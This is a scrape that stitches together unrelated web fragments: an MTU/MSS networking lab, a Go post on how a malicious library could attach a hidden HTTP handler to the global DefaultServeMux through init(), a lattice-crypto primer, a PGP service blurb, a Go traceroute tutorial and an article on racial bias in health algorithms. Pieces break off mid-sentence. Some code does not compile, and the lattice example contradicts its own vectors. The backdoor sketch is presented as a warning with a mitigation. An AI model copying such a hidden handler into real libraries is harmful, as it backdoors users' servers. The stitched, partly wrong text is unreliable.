--- client-direct ping statistics ---
2 packets transmitted, 0 received, 100% packet loss, time 19ms

root@server:/# 
</code></pre></div></div>

<p>Notice that the <code>client</code> host is immediately able to observe that it cannot send a packet this large since the MTU on the interface is 1200. However, the <code>server</code> host believes the MTU of the link is 1500, so sends the packet, however the <code>client</code> is unable to receive it. This occurs at such a low level that neither host is aware of the failure - the packet just disappears.</p>

<h2 id="tcp-mss-maximum-segment-size">TCP MSS: Maximum Segment Size</h2>

<p>The TCP MSS (Maximum Segment Size) sounds very similar to MTU, and since it relates to the maximum size of network packets, they are easy to conflate even though they are quite different. A TCP segment is the TCP header and TCP data that forms part of a single packet. The MSS specifies the expected maximum size of the data component of this segment that a host expects it would be able to receive without the IP packet being <a href="https://en.wikipedia.org/wiki/IP_fragmentation">fragmented</a>. IP fragmentation is typically disabled for TCP packets on modern networking stacks due to the added complexity and overhead, so the MSS represents the maximum size that the host expects to be able to receive in any given packet.</p>

<p><img alt="Ethernet / IP / TCP headers with MTU and MSS indicated" src="https://theojulienne.io/images/mtu-mss-why-connections-stall/mtu-mss-packet.png">
</p>

<p>Rather than being an interface-level configuration like MTU, the MSS advertisement forms a part of the typical TCP handshake and is calculated based on the underlying MTU of the interface that a local host will use to communicate with a remote host. MSS can be thought of as a TCP hint around how much data can be included in a single TCP packet, given the current MTU. Each host calculates the MSS it will advertise by taking the local MTU and subtracting the size of the IP and TCP headers, then includes that MSS in the TCP options of the SYN or SYN-ACK packet as part of the <a href="https://en.wikipedia.org/wiki/TCP_handshake">TCP three-way handshake</a>.</p>

<p>This is not a negotiation of a single MSS, but rather each host is giving the remote host an indication of the maximum size of a single packet it expects will be possible to send back. This number must be less than the MTU minus IP/TCP headers, since there’s no way any larger packet could arrive given the local MTU. Each host will use the remote host’s advertised MSS as a hint for what size individual outgoing packets should be. Since this is a configurable hint, it is also only unidirectional, and although a host may advertise a lower MSS than it can otherwise handle, that doesn’t in any way restrict it from sending packets larger than the MSS it advertised (providing the remote host allowed for it).</p>

<p>The simple MSS exchange happens to work around small misconfigurations of MTU, such as the trivial example described above:</p>

<p><img alt="Client and server connected with mismatching MTU" src="https://theojulienne.io/images/mtu-mss-why-connections-stall/simple-2-computers-mismatch.png">
</p>

<p>In this case, the client would advertise an MSS of <code>1200 (MTU) - 20 (IP hdr) - 20 (TCP hdr) = 1160</code>, which would cause the server to refrain from sending packets that contained more than 1160 bytes in the TCP payload, which also ensures it would be able to arrive within the bounds of the MTU of 1200 once those headers are added on.</p>

<p>However, the above network is still misconfigured, since even though TCP happens to work around it, other protocols will fail since they don’t exchange MSS values. MSS is actually intended to allow hosts to work around valid configurations where their own local networks have different MTU, such as the following:</p>

<p><img alt="Client and server connected with different MTUs, but valid configuration" src="https://theojulienne.io/images/mtu-mss-why-connections-stall/router-different-mtu.png">
</p>

<p>In this example, if the server with a valid MTU of 9000 attempted to send an Ethernet frame containing more than 1500 bytes without fragmentation being allowed, that packet would not be able to make it to the client. The intermediary router, being the first host that is aware of this problem as it is aware of the MTU of both links, would send an ICMPv4 “Fragmentation required, but DF set” message or an ICMPv6 “Packet Too Big” message back to the sender to inform it that forwarding the packet without breaking it up is not possible (and that the IP header had the DF, or Don’t Fragment, bit set).</p>

<p>However, TCP will succeed in unrestricted communications between these hosts due to the MSS advertisements. The server in this configuration will receive an MSS from the client that will ensure no Ethernet frames with a payload larger than 1500 bytes are generated, so they will be received successfully.</p>

<h3 id="mss-in-the-lab">MSS in the lab</h3>

<p>Select the scenario from above with the client on a network with 1500 MTU and the server on a network with 9000 MTU:</p>
<div><div><pre><code>vagrant@blog-lab-mtu:/vagrant$ /vagrant/bin/scenario client_net_smaller
</code></pre></div></div>

<p>Running a ping from the side with the larger MTU, we can observe that packets larger than the client’s MTU cause the intermediary router to return an ICMP message since it is unable to forward the packet:</p>
<div><div><pre><code>vagrant@blog-lab-mtu:/vagrant$ /vagrant/bin/shell server
root@server:/# ping -c 2 -M do -s 3000 client
PING client (172.29.0.10) 3000(3028) bytes of data.
From 172.30.0.20 icmp_seq=1 Frag needed and DF set (mtu = 1500)
ping: local error: Message too long, mtu=1500

--- client ping …</code></pre></div></div></article></div>

  <p><span>21 Aug 2020</span></p><p>I saw many guides and post showing a handy and simple way to create a webserver in go like this:</p>

<div><div><pre><code><span>package</span> <span>main</span>

<span>import</span> <span>(</span>
    <span>"fmt"</span>
    <span>"log"</span>

<span>func</span> <span>main</span><span>()</span> <span>{</span>
    <span>http</span><span>.</span><span>HandleFunc</span><span>(</span><span>"/ping"</span><span>,</span> <span>func</span><span>(</span><span>w</span> <span>http</span><span>.</span><span>ResponseWriter</span><span>,</span> <span>r</span> <span>*</span><span>http</span><span>.</span><span>Request</span><span>){</span>
        <span>fmt</span><span>.</span><span>Fprintf</span><span>(</span><span>w</span><span>,</span> <span>"pong"</span><span>)</span>
    <span>})</span>


    <span>fmt</span><span>.</span><span>Printf</span><span>(</span><span>"Starting server at port 8080</span><span>\n</span><span>"</span><span>)</span>
    <span>if</span> <span>err</span> <span>:=</span> <span>http</span><span>.</span><span>ListenAndServe</span><span>(</span><span>":8080"</span><span>,</span> <span>nil</span><span>);</span> <span>err</span> <span>!=</span> <span>nil</span> <span>{</span>
        <span>log</span><span>.</span><span>Fatal</span><span>(</span><span>err</span><span>)</span>
    <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>Internally http.HandleFunc and http.Handle register the handler/handler function in the DefaultServerMux. The problem is that DefaultServerMux is a global and exported var.</p>

<p>An attacker might develop a malicious lib or hijack an existing one and attach a handler to the DefaultHandlerMux, for example in the init.</p>

<div><div><pre><code><span>func</span> <span>init</span><span>(){</span>
	<span>someBoringSetUp</span><span>()</span>
<span>}</span>

<span>func</span> <span>someBoringSetUp</span><span>(){</span>

	<span>_</span> <span>=</span> <span>json</span><span>.</span><span>NewEncoder</span><span>(</span><span>w</span><span>)</span><span>.</span><span>Encode</span><span>(</span><span>map</span><span>[</span><span>string</span><span>]</span><span>interface</span><span>{}{</span><span>"inyected: "</span><span>:</span> <span>&amp;</span><span>asd</span><span>})</span>
<span>}</span>
</code></pre></div></div>

<p>Its not hard to hide or obfuscate code in large projects or codebases but
the way to mitigate this problem is quite simple, just create a new server mux:</p>

<div><div><pre><code><span>serverMux</span> <span>:=</span> <span>http</span><span>.</span><span>NewServeMux</span><span>()</span>
</code></pre></div></div>

<p>In my opinion the biggest and most important lesson is not to add untrusted third-party libraries without a minimum verification.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text">
			
<p>Lattice-based cryptography has been coming into the spotlight recently. In January 2019, Many of the semifinalists in the <a href="https://www.nist.gov/news-events/news/2019/01/nist-reveals-26-algorithms-advancing-post-quantum-crypto-semifinals" rel="noopener">NIST post-quantum-cryptography competition</a> were based on lattices. Lattice based cryptography has promising aspects that make it a contender for the basis of cryptographic security in a post-quantum world.</p>



<h2>What is a Lattice?</h2>



<p> According to <a href="https://en.wikipedia.org/wiki/Lattice-based_cryptography" rel="noopener">Wikipedia</a>, a lattice&nbsp;is the set of all integer linear combinations of basis vectors:</p>



<div><div>
<div><figure><img loading="lazy" src="https://wikimedia.org/api/rest_v1/media/math/render/svg/66095403ff779502911d684cccf77daff8981b56" alt="{\displaystyle \mathbf {b} _{1},\ldots ,\mathbf {b} _{n}\in \mathbb {R} ^{n}}" width="128" height="21" title="66095403ff779502911d684cccf77daff8981b56"></figure></div>
</div></div>



<p>i.e.</p>



<div><div>
<div><figure><img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/bfe3dc9615c168ff919b1c5b229ad392229b8c1d" alt="{\displaystyle L={\Big \{}\sum a_{i}\mathbf {b} _{i}\ :\ a_{i}\in \mathbb {Z} {\Big \}}\;.}" title="bfe3dc9615c168ff919b1c5b229ad392229b8c1d"></figure></div>
</div></div>



<p>More simply put, a lattice is defined by basis vectors, which are only able to be scaled by integers… yay no fractions! </p>



<p>For example, let’s create a lattice of all the integers in a two-dimensional plane:</p>



<figure><img loading="lazy" width="1024" height="740" src="https://qvault.io/wp-content/uploads/2020/01/Capture-1024x740.png" alt="two dimensional lattice" srcset="https://qvault.io/wp-content/uploads/2020/01/Capture-1024x740.png 1024w, https://qvault.io/wp-content/uploads/2020/01/Capture-300x217.png 300w, https://qvault.io/wp-content/uploads/2020/01/Capture-768x555.png 768w, https://qvault.io/wp-content/uploads/2020/01/Capture-100x72.png 100w, https://qvault.io/wp-content/uploads/2020/01/Capture-862x623.png 862w, https://qvault.io/wp-content/uploads/2020/01/Capture-1200x867.png 1200w, https://qvault.io/wp-content/uploads/2020/01/Capture.png 1255w" sizes="(max-width: 1024px) 100vw, 1024px" title="Capture"></figure>



<p>The definition of our lattice contains only 2 basis vectors,</p>



<p>v1 = (0,1) </p>



<p>v2 = (1,0)</p>



<figure><img loading="lazy" width="1024" height="740" src="https://qvault.io/wp-content/uploads/2020/01/Capture2-1-1024x740.png" alt="lattice with two vectors" srcset="https://qvault.io/wp-content/uploads/2020/01/Capture2-1-1024x740.png 1024w, https://qvault.io/wp-content/uploads/2020/01/Capture2-1-300x217.png 300w, https://qvault.io/wp-content/uploads/2020/01/Capture2-1-768x555.png 768w, https://qvault.io/wp-content/uploads/2020/01/Capture2-1-100x72.png 100w, https://qvault.io/wp-content/uploads/2020/01/Capture2-1-862x623.png 862w, https://qvault.io/wp-content/uploads/2020/01/Capture2-1-1200x867.png 1200w, https://qvault.io/wp-content/uploads/2020/01/Capture2-1.png 1255w" sizes="(max-width: 1024px) 100vw, 1024px" title="Capture2 1"></figure>



<p>Our lattice is the set of <strong>all </strong>values that can be reached by any combination and scale of our basis vectors. For example, the point (2,0) is in our lattice because it can be reached by 2*v1</p>



<figure><img loading="lazy" width="1024" height="740" src="https://qvault.io/wp-content/uploads/2020/01/Capture3-1-1024x740.png" alt="lattice with combination of vectors" srcset="https://qvault.io/wp-content/uploads/2020/01/Capture3-1-1024x740.png 1024w, https://qvault.io/wp-content/uploads/2020/01/Capture3-1-300x217.png 300w, https://qvault.io/wp-content/uploads/2020/01/Capture3-1-768x555.png 768w, https://qvault.io/wp-content/uploads/2020/01/Capture3-1-100x72.png 100w, https://qvault.io/wp-content/uploads/2020/01/Capture3-1-862x623.png 862w, https://qvault.io/wp-content/uploads/2020/01/Capture3-1-1200x867.png 1200w, https://qvault.io/wp-content/uploads/2020/01/Capture3-1.png 1255w" sizes="(max-width: 1024px) 100vw, 1024px" title="Capture3 1"></figure>



<p>Similarly, we could create an entirely new lattice by changing our basis vectors to</p>



<p>v1 = (0,3)</p>



<p>v2 = (3,0)</p>



<figure><img loading="lazy" width="1024" height="583" src="https://qvault.io/wp-content/uploads/2020/01/Capture5-1-1024x583.png" alt="lattice with change of basic vectors" srcset="https://qvault.io/wp-content/uploads/2020/01/Capture5-1-1024x583.png 1024w, https://qvault.io/wp-content/uploads/2020/01/Capture5-1-300x171.png 300w, https://qvault.io/wp-content/uploads/2020/01/Capture5-1-768x437.png 768w, https://qvault.io/wp-content/uploads/2020/01/Capture5-1-100x57.png 100w, https://qvault.io/wp-content/uploads/2020/01/Capture5-1-862x491.png 862w, https://qvault.io/wp-content/uploads/2020/01/Capture5-1-1200x683.png 1200w, https://qvault.io/wp-content/uploads/2020/01/Capture5-1.png 1315w" sizes="(max-width: 1024px) 100vw, 1024px" title="Capture5 1"></figure>



<p>As you can see, now the intermediary points (0,1) and (0,1) <strong>no longer exist</strong> in our lattice. There is no way to scale v1 (0,3) and v2 (3,0) to reach those points without using fractional scalars. With lattices, we can only scale by whole integers.</p>



<h2>How Does This Help With Crypto?</h2>



<p>Cryptographic algorithms are typically based on mathematical problems that are easy to verify the answer of, but hard to calculate.</p>



<p>For example, RSA is based on prime factorization. If I told you to find prime factors of <em>27,919,645,564,169,759</em>, that would be hard. However, if I told you that 48,554,491 and 575,016,749 <em>are </em>prime factors, all you have to do is multiply them together in order to verify my answer.</p>



<p>RSA works great with classical computers. There are <a href="https://crypto.stackexchange.com/questions/10590/what-makes-rsa-secure-by-using-prime-numbers" target="_blank" aria-label=" (opens in a new tab)" rel="noreferrer noopener nofollow">no known solutions to find prime factors</a> of a number reliably in less than exponential time.</p>



<p>In the quantum world, things don’t look so peachy. <a href="https://en.wikipedia.org/wiki/Shor%27s_algorithm" target="_blank" aria-label="Shor's algorithm (opens in a new tab)" rel="noreferrer noopener nofollow">Shor’s algorithm</a> on quantum computers can crack RSA in less than exponential time. For this reason, we need quantum-safe algorithms. Many believe that lattice math could be an answer.</p>

<p><a aria-label=" (opens in a new tab)" rel="noreferrer noopener nofollow" href="https://en.wikipedia.org/wiki/Lattice_problem#Shortest_vector_problem_(SVP)" target="_blank">The shortest vector problem (SVP)</a> is one of the fundamentals problems presented by lattices that allow them to be useful in cryptography.</p>



<p>Simply put, the goal of SVP is for the attacker to find the shortest vector from the origin (above in red) when given the basis of a lattice (above in blue). A zero vector doesn’t work as an answer, we consider it trivial.</p>



<p>How is it solved?</p>



<p>Like RSA with classical computers, it is hard to find the shortest vector of a large lattice, especially if it exists in many dimensions. One such slow solution for approximating the shortest vector is <a href="https://en.wikipedia.org/wiki/L%C3%A1szl%C3%B3_Babai" target="_blank" aria-label=" (opens in a new tab)" rel="noreferrer noopener nofollow">Babai</a>‘s algorithm, or <a href="https://cims.nyu.edu/~regev/teaching/lattices_fall_2004/ln/cvp.pdf" target="_blank" aria-label=" (opens in a new tab)" rel="noreferrer noopener nofollow">Nearest Plane Algorithm</a>, which you can read about in the links provided.</p>

        <p>Pretty Good Privacy (PGP) is a program to encrypt your emails, texts, files, etc. As emails on Gmail, Yahoo, Outlook and other popular email services are stored in <strong>cleartext</strong>, PGP can be a solution to keep your emails from being read &amp; analyzed by these big techs.</p>

<p>PGP is based on <a href="https://en.wikipedia.org/wiki/Public-key_cryptography">public-key cryptography</a>. Essentially you have 2 keys: a public key and a private key. Your public key is <strong>known</strong> to everyone whereas <strong>only</strong> you have access to the private key. A message encrypted with the public key can only be decrypted with the private key. You can learn more about PGP on <a href="https://www.openpgp.org/">openpgp</a>.</p>

<blockquote>
<p>In practice, if someone wants to send you a secret message that only you can read, this person encrypts the message using your public key.</p>
</blockquote>

<p>Without PGP, the emails sent to an alias are forwarded by SimpleLogin <strong>as-is</strong> to your mailbox, leaving anyone in-between or your email service being able to read your emails.</p>



<p><img src="https://simplelogin.io/blog/without-pgp.png"></p><hr>

<p>With PGP enabled, all emails arrived at SimpleLogin are <strong>encrypted</strong> with your public key before being forwarded to your mailbox.</p>

<p>As emails are not stored on SimpleLogin, only you can read your emails.</p>



<p><img src="https://simplelogin.io/blog/with-pgp.png"></p><blockquote>
<p>If you upload your PGP public key on SimpleLogin, <strong>only you</strong> can now read the emails sent to your aliases.</p>
</blockquote>

<p>You can create and manage your keys when adding/editing your mailboxes. Check it out your <a href="https://app.simplelogin.io/dashboard/mailbox">mailbox dashboard â†—</a>.</p>

<p>As PGP encryption is resource-intensive, this feature is only available in the Premium plan or during the trial period.</p>

<p>After the trial, SimpleLogin stops encrypting the forwarded emails.</p>

<h3 id="what-is-traceroute">What is traceroute?</h3>
<p>If you’ve fiddled with networks you must be familiar with the famous <code>traceroute</code> tool. Its a script that traces the path to a host and prints info on every hop it encounters. To give an example if you run <code>traceroute kalbhor.xyz</code> you should see something like this :</p>

</code></pre><p>These might differ for you but for me this is the route my computer takes to connect to <code>kalbhor.xyz</code>. A few interesting details here include <code>dlinkrouter.dlink (192.168.0.1)</code>. Yes, that looks similar! It is my routers local IP, which means my router at home is the first machine to process my request. That’s pretty obvious.</p>
<p>Next we see <code>broadband.actcorp.in (49.207.47.201)</code> which is my ISP. We can also see that my request forwards to a ISP router in Delhi (most probably a regional level ISP) and further moves through Chennai and Singapore (kalbhor.xyz is hosted on an AWS Singapore server).</p>
<p>This tool is very useful to inspect network paths and solve problems. But aside from that, this tool is extremely interesting and its actual implementation is pretty simple.</p>
<hr>
<h3 id="how-does-traceroute-work">How does traceroute work?</h3>
<p>Now that we understand what traceroute does, lets take a look under the hood. Every TCP/UDP packet that travels has a bunch of headers containing info about the packet. One such header is the <code>ttl</code> header which is the number of hops the packet travels before being dropped. So if we set this <code>ttl</code> header to 1 our packet will reach the first hop and be dropped, if we set it to 2 our packet will reach the second hop and drop, and so on.</p>
<p>Now that we know how our packets can reach any of the hops between us and our destination, how do we collect info on the hop?
When a server/router drops a packet, it returns a  <code>ICMP Time Exceeded</code> message back. Parsing this message will allow us to retrieve info on the particular hop. Once the destination is reached (last hop) we are returned a <code>ICMP Destination Unreachable</code> message.</p>
<hr>
<h3 id="implementing-traceroute">Implementing traceroute</h3>
<p>Now that we understand what’s happening under the hood, we can roughly design a way to implement traceroute.
The steps to implement it should look something like this:</p>
<ul>
<li>Open a socket connection between us and our destination and send UDP packets</li>
<li>Start from TTL=1 and keep increasing the TTL value on the UDP packets</li>
<li>Open a socket that listens for the ICMP messages and parses them</li>
</ul>
<hr>
<h3 id="writing-a-go-application-that-implements-traceroute">Writing a Go application that implements traceroute</h3>
<p>Now we know what we want and all we need to do is implement it in any language. I’m implementing this in Go. The <code>net</code> and <code>syscall</code> package will help us along the way.</p>
<p><em>Note: I will be using minimal code just to show the main implementation (so you probably wont see me handling errors, etc here). For a more refinded well developed version of this code check out <a href="https://github.com/kalbhor/tracesite">the repository</a>.</em></p>
<p>Lets start by creating the sockets we’ll use for sending and recieving data.</p>
<pre><code>sendSocket, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_DGRAM, syscall.IPPROTO_UDP)
recvSocket, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_ICMP)
defer syscall.Close(recvSocket)
defer syscall.Close(sendSocket)
</code></pre><p>Lets create a ttl variable which we’ll iterate and a timevalue variable that defines our timeout</p>
<pre><code>ttl := 1
// For 2000Ms
tv := syscall.NsecToTimeval(1000 * 1000 * (int64)(2000)) 
</code></pre><p>Next lets set the ttl and timeout value for the packets we’ll send in the socket</p>
<pre><code>syscall.SetsockoptInt(sendSocket, 0x0, syscall.IP_TTL, ttl)
syscall.SetsockoptTimeval(recvSocket, syscall.SOL_SOCKET, syscall.SO_RCVTIMEO, &amp;tv)
</code></pre><p>At this point our sockets are ready to send and recieve data. What we need to do is find the destination address for our <code>sendSocket</code> and a network interface on our machine for our <code>recvSocket</code></p>
<pre><code>func socketAddr() ([4]byte, error) {
    socketAddr := [4]byte{0, 0, 0, 0}
    addrs, err := net.InterfaceAddrs()
    if err != nil {
        return socketAddr, err
    }

    for _, a := range addrs {
        if ipnet, ok := a.(*net.IPNet); ok &amp;&amp; !ipnet.IP.IsLoopback() {
            if len(ipnet.IP.To4()) == net.IPv4len {
                copy(socketAddr[:], ipnet.IP.To4())
                return socketAddr, nil
            }
        }
    }
    err = errors.New("Not connected to the Internet")
    return socketAddr, err
}

func destAddr(dest string) ([4]byte, error) {
    destAddr := [4]byte{0, 0, 0, 0}
    addrs, err := net.LookupHost(dest)
    if err != nil {
        return destAddr, err
    }
    addr := addrs[0]

    ipAddr, err := net.ResolveIPAddr("ip", addr)
    if err != nil {
        return destAddr, err
    }
    copy(destAddr[:], ipAddr.IP.To4())
    return destAddr, nil
}
</code></pre><p>And in our main function we use these functions the get the addresses our sockets will use</p>
<pre><code>destAddr, err := destAddr("google.com")
socketAddr, err := socketAddr()
</code></pre><p>Lets bind our <code>recvSocket</code> so that it can recieve messages and lets send a null byte to our destination through our <code>sendSocket</code>. We connect to the port 33434.</p>
<pre><code>syscall.Bind(recvSocket, &amp;syscall.SockaddrInet4{Port: 33434, Addr: socketAddr})
syscall.Sendto(sendSocket, []byte{0x0}, 0, &amp;syscall.SockaddrInet4{Port: 33434, Addr: destAddr})
</code></pre><p>Now we need to parse the messages being sent on our <code>recvSocket</code></p>
<pre><code>p := make([]byte, options.Int(56)) // The integer here is the packet size
n, from, err := syscall.Recvfrom(recvSocket, p, 0)

ip := from.(*syscall.SockaddrInet4).Addr
ipString := fmt.Sprintf("%v.%v.%v.%v", ip[0], ip[1], ip[2], ip[3])
host, err := net.LookupAddr(ipString)

fmt.Println(host)
fmt.Println(ipString)
</code></pre><p>The Recvfrom method returns a <code>Sockaddr</code> type to our <code>from</code> variable. Hence if we parse our <code>from</code> variable we can get the IP info on the hop. We can use this with <code>net.LookupAddr</code> to run a reverse search and get the hostname (domain name) through the IP.</p>
<p>We’re almost done! All we need to do is wrap this functionality in a for loop and keep updating the <code>ttl</code> variable.</p>
<pre><code>func main() {
    sendSocket, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_DGRAM, syscall.IPPROTO_UDP)
    recvSocket, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_ICMP)
    defer syscall.Close(recvSocket)
    defer syscall.Close(sendSocket)

    ttl := 1
    tv := syscall.NsecToTimeval(1000 * 1000 * (int64)(2000)) // For 2000Ms

    for {
        syscall.SetsockoptInt(sendSocket, 0x0, syscall.IP_TTL, ttl)
        syscall.SetsockoptTimeval(recvSocket, syscall.SOL_SOCKET, syscall.SO_RCVTIMEO, &amp;tv)

        destAddr, err := destAddr("google.com")
        socketAddr, err := socketAddr()
        destAddrString := fmt.Sprintf("%v.%v.%v.%v", destAddr[0], destAddr[1], destAddr[2], destAddr[3]) 


        syscall.Bind(recvSocket, &amp;syscall.SockaddrInet4{Port: 33434, Addr: socketAddr})
        syscall.Sendto(sendSocket, []byte{0x0}, 0, &amp;syscall.SockaddrInet4{Port: 33434, Addr: destAddr})

        p := make([]byte, options.Int(56)) // The integer here is the packet size
        n, from, err := syscall.Recvfrom(recvSocket, p, 0)

        ip := from.(*syscall.SockaddrInet4).Addr
        ipString := fmt.Sprintf("%v.%v.%v.%v", ip[0], ip[1], ip[2], ip[3])
        host, err := net.LookupAddr(ipString)
        
        fmt.Println(host)
        fmt.Println(ipString)
        
        // We stop our loop if we reach destination or reach max value for ttl
        if ipString == destAddrString || ttl &gt;= 56 { 
                break
        }

        ttl += 1

    }

}
</code></pre><p>Note that we added an if statement block to end our for loop once we reach the destination address or exceed max value for hops.</p>
<hr>
<h3 id="conclusion">Conclusion</h3>

<p>The power of artificial intelligence has transformed health care by using massive datasets to improve diagnostics, treatment, records management, and patient outcomes. Complex decisions that once took hours — such as making a breast or lung cancer diagnosis based on imaging studies, or deciding when patients should be discharged — are now resolved within seconds by machine learning and deep learning applications.</p>



<p>Any technology, of course, will have its limitations and flaws. And over the past few years, a steady stream of evidence has demonstrated that some of these AI-powered medical technologies are <a href="https://www.forbes.com/sites/insights-intelai/2019/02/11/rethinking-medical-ethics/#408d1cce6f03">replicating</a> racial bias and <a href="https://www.nature.com/articles/d41586-019-02872-2">exacerbating</a> historic health care inequities. Now, amid the SARS-CoV-2 pandemic, some researchers are asking whether these new technologies might be contributing to the <a href="https://www.hopkinsmedicine.org/health/conditions-and-diseases/coronavirus/covid19-racial-disparities">disproportionately</a> high rates of virus-related illness and death among African Americans. African Americans aged 35 to 44 experience Covid-19 mortality rates that are <a href="https://cdn1.sph.harvard.edu/wp-content/uploads/sites/1266/2020/06/20_Bassett-Chen-Krieger_COVID-19_plus_age_working-paper_0612_Vol-19_No-3_with-cover.pdf">nine times higher</a> than their White counterparts. Many African Americans also say they have <a href="https://www.washingtonpost.com/graphics/2020/politics/coronavirus-race-african-americans/">limited access</a> to Covid-19 testing.</p>



<p>During the early weeks of the pandemic, <a href="https://www.bet.com/news/national/2020/04/29/coronavirus-retail-testing-sites-african-american-communities-fail.html">there were</a> few — if any — Covid-19 testing locations in African American communities. Public health officials in states such as <a href="https://www.npr.org/sections/health-shots/2020/05/03/849243723/californias-coronavirus-testing-still-a-frustrating-patchwork-of-haves-and-have">California</a>, <a href="https://www.nbcchicago.com/news/local/lightfoot-announces-6-new-testing-sites-in-chicago/2270017/">Illinois</a>, <a href="https://healthitanalytics.com/news/leveraging-covid-19-data-to-eliminate-healthcare-disparities">Tennessee</a>, and <a href="https://www.npr.org/sections/health-shots/2020/05/27/862215848/across-texas-black-and-hispanic-neighborhoods-have-fewer-coronavirus-testing-sit">Texas</a> have said that decisions about whom and where to test were data-driven and reflected the demographics of early cases. Yet the initial focus on affluent White communities allowed thousands of infections to quickly spread across cities and towns whose residents experience disproportionately high rates of <a href="https://www.cdc.gov/coronavirus/2019-ncov/need-extra-precautions/racial-ethnic-minorities.html">underlying health conditions</a>.</p>



<p>African American communities should have been prioritized for testing locations, says Alondra Nelson, a sociologist and president of the <a href="https://www.ssrc.org/about/who-we-are/">Social Science Research Council</a>, an almost 100-year-old independent research organization that advances better understanding of social science. When algorithms overlooked health disparities as a risk factor, Nelson says, public health officials issued an implicit statement to African American communities: “We’re not going to triage and treat you.”</p>



<p>Those who study the problem say that the extent of racial bias in AI medical technologies is unknown. This is, in part, due to a lack of transparency: The software is often proprietary, which means the intellectual property — the process, inputs, and source coding — is protected and copyrighted. Independent researchers have very little, if any, access to the data. “We’re in a new space,” says Nelson. In many instances, big data is now a business product. This is why she and others say that fixing racial bias in AI may involve addressing not just science, but also policy and law.</p>



<p>The stakes are high. Algorithms affect the lives of virtually all Americans, making <a href="https://www.jdsupra.com/legalnews/alert-ai-and-algorithms-ftc-issues-59515/">rapid, automated decisions</a> in <a href="https://www.marketwatch.com/story/ai-based-credit-scores-will-soon-give-one-billion-people-access-to-banking-services-2018-10-09">credit</a>, finance, <a href="https://www.vox.com/recode/2019/12/12/20993665/artificial-intelligence-ai-job-screen">employment</a>, compensation, <a href="https://www.curbed.com/2019/12/17/21026311/mortgage-apartment-housing-algorithm-discrimination">housing</a>, <a href="https://www.nytimes.com/2020/02/06/technology/predictive-algorithms-crime.html">courts and sentencing</a>, health, medicine, and other areas. These decisions are critical to our daily lives, and they are largely automated.</p>



<hr>



<p>Last fall, a research team published a <a href="https://science.sciencemag.org/content/366/6464/447.full">paper</a> in the journal Science that for the first time attempted to quantify the extent of racial bias in patient care and outcomes. The researchers studied an algorithm developed by Optum, a subsidiary of the world’s largest health care company, UnitedHealth Group.&nbsp;Other companies, such as 3M Health Information Systems and Verisk Health, <a href="https://www.soa.org/globalassets/assets/Files/Research/research-2016-accuracy-claims-based-risk-scoring-models.pdf">produce</a> similar algorithms, as do some universities and the Centers for Medicare and Medicaid Services.</p>



<p>The algorithm under study was used to identify patients with complex medical needs and assign each what is known as a “risk score.” Patients with the highest scores are eligible for additional resources, such as home visits by a nurse, expedited primary care visits, and automatic prescription refills. The research team looked at how the algorithm performed at an unnamed medical center, which provided the health care records for nearly 50,000 patients. Almost 44,000 were White and about 6,000 were Black. Researchers compared the patients’ risk scores with their actual health data, including illness history and test results.&nbsp;</p>



<p>The way the medical center used the algorithm, the researchers concluded, was not neutral and unbiased. African Americans, for example, comprised just 18 percent of the medical center’s high-risk group when assessed using the algorithm. But when looking at actual patient health data, the Science researchers concluded the high-risk group should have been 47 percent African American. The discrepancy meant that White patients were granted access to resources ahead of African American patients who were less healthy.</p>



<p>The reason: The algorithm was trained to identify patients with higher anticipated future health care costs. It may seem reasonable to equate higher anticipated costs with deteriorating health, says the study’s lead author, <a href="https://publichealth.berkeley.edu/people/ziad-obermeyer/">Ziad Obermeyer</a>, an emergency medicine physician and an associate professor at the University of California, Berkeley School of Public Health. But the formula privileges patients with higher incomes and top tier health insurance plans that cover preventive care, more doctor visits, higher cost prescriptions and such. It also ignores the reality that many low-income patients — who are disproportionately African American — are more likely to seek medical care only when their symptoms are severe.</p>



<p>The result: Poorer Black patients appear healthier than they actually are.&nbsp;</p>



<figure id="promo-table"><table><tbody><tr><td><img src="https://undark.org/wp-content/uploads/2020/03/cv19.png" width="80px"></td><td><br><em>For all of Undark’s coverage of the global Covid-19 pandemic, please visit our extensive <a href="https://sinapticas.com/covid19">coronavirus archive</a>.</em></td></tr></tbody></table></figure>



<p>What’s “so striking” and “sadly very familiar” are that these algorithms are mimicking the structural racism evident across American society and in health care, says Obermeyer. These types of screening algorithms should “identify people who have the same health needs irrespective of the color of their skin,” Obermeyer adds. “That turns out not to be the case.”&nbsp;</p>



<p>In an email to Undark, Optum spokesperson Tyler Mason took issue with the Science analysis. “The study in question grossly mischaracterized a cost-prediction algorithm . . . based on one health system’s incorrect use of it, which was completely inconsistent with any recommended use of the tool.” That recommended use, according to Optum, is to model potential future health care costs for individual patients based on past health care experiences. It is not intended to assist doctors in making care decisions. The algorithm “does not result in racial bias when used for that purpose,” Mason added.</p>



<p>Obermeyer agreed that the algorithm is not racially biased when used as a predictor of cost. “It predicts cost equally well for Black and White patients,” he wrote in an email. But he disagreed with the implication that just one hospital was misusing the algorithm. “On the one hand, everyone knew it was a cost predictor; on the other hand, everyone was very obviously using it to predict risk,” he wrote. As Obermeyer sees it, the problem was systemic: Software developers, hospitals, insurers, researchers — “we were all just thinking about this . . . in a way that was subtly but importantly wrong.”</p>



<p>Because risk-prediction algorithms are widely used, some researchers are now asking if their use contributed to the significant racial disparities seen in Covid-19 treatment and access to testing.</p>



<p>The narrative around Covid-19 and African Americans has largely been about comorbidities, says Nelson. As a group, African Americans experience <a href="https://minorityhealth.hhs.gov/omh/browse.aspx?lvl=4&amp;lvlid=18">higher rates</a> of many serious health problems, including hypertension and diabetes. These conditions make people <a href="https://www.cdc.gov/coronavirus/2019-ncov/need-extra-precautions/people-with-medical-conditions.html">more vulnerable</a> to Covid-19. “If we know that African Americans are more likely to have poor health outcomes because they have these comorbidities,” says Nelson, then they, as well as Latinos and Indigenous people, should have been prioritized for testing.</p>



